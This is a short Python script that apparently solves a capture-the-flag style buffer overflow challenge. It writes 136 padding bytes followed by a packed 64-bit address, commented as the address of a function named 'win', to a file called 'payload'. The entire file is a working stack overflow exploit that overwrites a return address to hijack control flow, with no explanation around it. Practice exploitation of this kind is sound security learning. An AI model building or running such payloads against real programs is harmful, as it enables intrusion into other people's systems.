#!/usr/bin/env python3

from struct import pack

payload = b'a' * 136

# The address of the function win
payload += pack("<Q", 0x402121)

with open("payload", "wb") as f:
    f.write(payload)